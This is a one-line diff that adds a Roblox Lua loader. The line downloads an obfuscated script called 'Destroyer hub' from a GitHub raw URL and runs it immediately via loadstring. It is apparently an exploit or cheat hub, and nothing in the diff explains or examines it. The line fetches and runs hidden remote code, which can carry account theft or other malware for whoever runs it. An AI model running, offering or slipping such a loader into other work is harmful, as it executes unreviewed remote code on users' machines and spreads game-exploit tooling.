@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterSimple/Destroyer-hub/refs/heads/main/Destroyer%20hub%20Obfuscated"))()
